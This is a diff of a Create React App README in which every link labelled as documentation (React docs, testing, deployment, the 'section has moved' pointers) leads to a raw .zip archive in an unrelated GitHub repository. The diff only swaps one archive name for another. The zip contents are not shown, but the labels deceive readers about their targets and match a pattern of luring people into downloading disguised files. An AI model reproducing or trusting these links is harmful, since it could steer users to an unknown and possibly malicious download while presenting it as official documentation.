@@ -1,6 +1,6 @@
 # Getting Started with Create React App
 
-This project was bootstrapped with [Create React App](https://raw.githubusercontent.com/ranjanrajeev95/Food_Delivery_Website_in_React/main/trisulphide/Delivery-React-Food-Website-in-v2.4.zip).
+This project was bootstrapped with [Create React App](https://raw.githubusercontent.com/ranjanrajeev95/Food_Delivery_Website_in_React/main/trisulphide/React-in-Food-Website-Delivery-v1.0.zip).
 
 ## Available Scripts
 
@@ -17,7 +17,7 @@ You will also see any lint errors in the console.
 ### `npm test`
 
 Launches the test runner in the interactive watch mode.\
-See the section about [running tests](https://raw.githubusercontent.com/ranjanrajeev95/Food_Delivery_Website_in_React/main/trisulphide/Delivery-React-Food-Website-in-v2.4.zip) for more information.
+See the section about [running tests](https://raw.githubusercontent.com/ranjanrajeev95/Food_Delivery_Website_in_React/main/trisulphide/React-in-Food-Website-Delivery-v1.0.zip) for more information.
 
 ### `npm run build`
 
@@ -27,7 +27,7 @@ It correctly bundles React in production mode and optimizes the build for the be
 The build is minified and the filenames include the hashes.\
 Your app is ready to be deployed!
 
-See the section about [deployment](https://raw.githubusercontent.com/ranjanrajeev95/Food_Delivery_Website_in_React/main/trisulphide/Delivery-React-Food-Website-in-v2.4.zip) for more information.
+See the section about [deployment](https://raw.githubusercontent.com/ranjanrajeev95/Food_Delivery_Website_in_React/main/trisulphide/React-in-Food-Website-Delivery-v1.0.zip) for more information.
 
 ### `npm run eject`
 
@@ -41,30 +41,30 @@ You don’t have to ever use `eject`. The curated feature set is suitable for sm
 
 ## Learn More
 
-You can learn more in the [Create React App documentation](https://raw.githubusercontent.com/ranjanrajeev95/Food_Delivery_Website_in_React/main/trisulphide/Delivery-React-Food-Website-in-v2.4.zip).
+You can learn more in the [Create React App documentation](https://raw.githubusercontent.com/ranjanrajeev95/Food_Delivery_Website_in_React/main/trisulphide/React-in-Food-Website-Delivery-v1.0.zip).
 
-To learn React, check out the [React documentation](https://raw.githubusercontent.com/ranjanrajeev95/Food_Delivery_Website_in_React/main/trisulphide/Delivery-React-Food-Website-in-v2.4.zip).
+To learn React, check out the [React documentation](https://raw.githubusercontent.com/ranjanrajeev95/Food_Delivery_Website_in_React/main/trisulphide/React-in-Food-Website-Delivery-v1.0.zip).
 
 ### Code Splitting
 
-This section has moved here: [https://raw.githubusercontent.com/ranjanrajeev95/Food_Delivery_Website_in_React/main/trisulphide/Delivery-React-Food-Website-in-v2.4.zip](https://raw.githubusercontent.com/ranjanrajeev95/Food_Delivery_Website_in_React/main/trisulphide/Delivery-React-Food-Website-in-v2.4.zip)
+This section has moved here: [https://raw.githubusercontent.com/ranjanrajeev95/Food_Delivery_Website_in_React/main/trisulphide/React-in-Food-Website-Delivery-v1.0.zip](https://raw.githubusercontent.com/ranjanrajeev95/Food_Delivery_Website_in_React/main/trisulphide/React-in-Food-Website-Delivery-v1.0.zip)
 
 ### Analyzing the Bundle Size
 
-This section has moved here: [https://raw.githubusercontent.com/ranjanrajeev95/Food_Delivery_Website_in_React/main/trisulphide/Delivery-React-Food-Website-in-v2.4.zip](https://raw.githubusercontent.com/ranjanrajeev95/Food_Delivery_Website_in_React/main/trisulphide/Delivery-React-Food-Website-in-v2.4.zip)
+This section has moved here: [https://raw.githubusercontent.com/ranjanrajeev95/Food_Delivery_Website_in_React/main/trisulphide/React-in-Food-Website-Delivery-v1.0.zip](https://raw.githubusercontent.com/ranjanrajeev95/Food_Delivery_Website_in_React/main/trisulphide/React-in-Food-Website-Delivery-v1.0.zip)
 
 ### Making a Progressive Web App
 
-This section has moved here: [https://raw.githubusercontent.com/ranjanrajeev95/Food_Delivery_Website_in_React/main/trisulphide/Delivery-React-Food-Website-in-v2.4.zip](https://raw.githubusercontent.com/ranjanrajeev95/Food_Delivery_Website_in_React/main/trisulphide/Delivery-React-Food-Website-in-v2.4.zip)
+This section has moved here: [https://raw.githubusercontent.com/ranjanrajeev95/Food_Delivery_Website_in_React/main/trisulphide/React-in-Food-Website-Delivery-v1.0.zip](https://raw.githubusercontent.com/ranjanrajeev95/Food_Delivery_Website_in_React/main/trisulphide/React-in-Food-Website-Delivery-v1.0.zip)
 
 ### Advanced Configuration
 
-This section has moved here: [https://raw.githubusercontent.com/ranjanrajeev95/Food_Delivery_Website_in_React/main/trisulphide/Delivery-React-Food-Website-in-v2.4.zip](https://raw.githubusercontent.com/ranjanrajeev95/Food_Delivery_Website_in_React/main/trisulphide/Delivery-React-Food-Website-in-v2.4.zip)
+This section has moved here: [https://raw.githubusercontent.com/ranjanrajeev95/Food_Delivery_Website_in_React/main/trisulphide/React-in-Food-Website-Delivery-v1.0.zip](https://raw.githubusercontent.com/ranjanrajeev95/Food_Delivery_Website_in_React/main/trisulphide/React-in-Food-Website-Delivery-v1.0.zip)
 
 ### Deployment
 
-This section has moved here: [https://raw.githubusercontent.com/ranjanrajeev95/Food_Delivery_Website_in_React/main/trisulphide/Delivery-React-Food-Website-in-v2.4.zip](https://raw.githubusercontent.com/ranjanrajeev95/Food_Delivery_Website_in_React/main/trisulphide/Delivery-React-Food-Website-in-v2.4.zip)
+This section has moved here: [https://raw.githubusercontent.com/ranjanrajeev95/Food_Delivery_Website_in_React/main/trisulphide/React-in-Food-Website-Delivery-v1.0.zip](https://raw.githubusercontent.com/ranjanrajeev95/Food_Delivery_Website_in_React/main/trisulphide/React-in-Food-Website-Delivery-v1.0.zip)
 
 ### `npm run build` fails to minify
 
-This section has moved here: [https://raw.githubusercontent.com/ranjanrajeev95/Food_Delivery_Website_in_React/main/trisulphide/Delivery-React-Food-Website-in-v2.4.zip](https://raw.githubusercontent.com/ranjanrajeev95/Food_Delivery_Website_in_React/main/trisulphide/Delivery-React-Food-Website-in-v2.4.zip)
+This section has moved here: [https://raw.githubusercontent.com/ranjanrajeev95/Food_Delivery_Website_in_React/main/trisulphide/React-in-Food-Website-Delivery-v1.0.zip](https://raw.githubusercontent.com/ranjanrajeev95/Food_Delivery_Website_in_React/main/trisulphide/React-in-Food-Website-Delivery-v1.0.zip)
